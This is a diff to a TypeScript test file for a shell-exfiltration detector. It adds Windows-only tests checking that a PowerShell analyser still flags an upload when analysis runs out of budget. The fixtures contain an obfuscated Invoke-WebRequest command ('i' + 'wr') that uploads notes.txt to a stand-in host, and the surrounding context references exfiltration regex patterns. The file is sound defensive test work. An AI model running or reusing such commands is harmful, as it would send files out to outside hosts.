@@ -20,6 +20,26 @@ import { measureCpuGrowth } from "../../__tests__/support/cpu-growth.js";
 import { shellExfiltrationSignal, shellSensitivePathSignal } from "../rules/shell-exfiltration.js";
 
 const CWD = "/work/project";
+
+// These fixed-size workloads reach the frame limit when native path roots carry a drive.
+describe.runIf(process.platform === "win32")("retained argument floors", () => {
+  it("keeps an argument upload when a later stage exhausts analysis", () => {
+    const upload = `Write-Output "& ('i' + 'wr') https://x.invalid -InFile notes.txt";`;
+    const command = upload + "Write-Output 'hello';".repeat(9);
+    const result = powerShellFloorAnalysis._inspectPowerShellForTest(command);
+    expect(result.exhausted).toBe(true);
+    expect(result.exfiltration).toContain("upload");
+  });
+
+  it("keeps an argument upload when a later argument exhausts analysis", () => {
+    const command = `Write-Output "& ('i' + 'wr') https://x.invalid -InFile notes.txt" `
+      + Array.from({ length: 23 }, (_, index) => `'hello${index}'`).join(" ");
+    const result = powerShellFloorAnalysis._inspectPowerShellForTest(command);
+    expect(result.exhausted).toBe(true);
+    expect(result.exfiltration).toContain("upload");
+  });
+});
+
 const POWERSHELL_INPUT_CAP = POWERSHELL_ANALYSIS_LIMITS.inputChars;
 
 const EXFIL: Array<[string, RegExp]> = [
